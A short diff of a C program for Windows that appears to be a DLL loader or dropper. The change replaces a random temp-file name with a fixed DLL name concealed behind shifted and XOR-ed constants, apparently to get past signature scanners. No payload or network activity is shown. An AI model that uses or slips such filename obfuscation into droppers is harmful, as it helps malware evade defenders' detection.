@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <psapi.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <time.h>
 #include <winternl.h>
@@ -212,11 +213,13 @@ int main(int argc, char* argv[], char* envp[])
 	}
 	//printf("[+] loaded dll of size %u\n", dll_size);
 	size_t temp_length = GetTempPathA(sizeof(dll_filename),dll_filename);
-	rand_string(dll_filename+temp_length, 5);
-	dll_filename[temp_length+5]='.';
-	dll_filename[temp_length+6]='d';
-	dll_filename[temp_length+7]='l';
-	dll_filename[temp_length+8]='l';
+	*(uint32_t*)(dll_filename+temp_length) = 0x7547a457;
+	*(uint32_t*)(dll_filename+temp_length) = (*(uint32_t*)(dll_filename+temp_length) << 12) | 0xa4d;
+	*(uint32_t*)(dll_filename+temp_length+4) = 0x41557863;
+	*(uint32_t*)(dll_filename+temp_length+4) = (*(uint32_t*)(dll_filename+temp_length+4) << 16) | 0x7a4d;
+	*(uint32_t*)(dll_filename+temp_length+8) = 0x84ec6d5f;
+	*(uint32_t*)(dll_filename+temp_length+8) ^= 0xe8800971;
+	dll_filename[temp_length+12] = 0;
 	//printf("[?] dll_filename = %s\n", dll_filename);
 	OFSTRUCT fileofstruct;
 	HANDLE dll_file = CreateFile(dll_filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
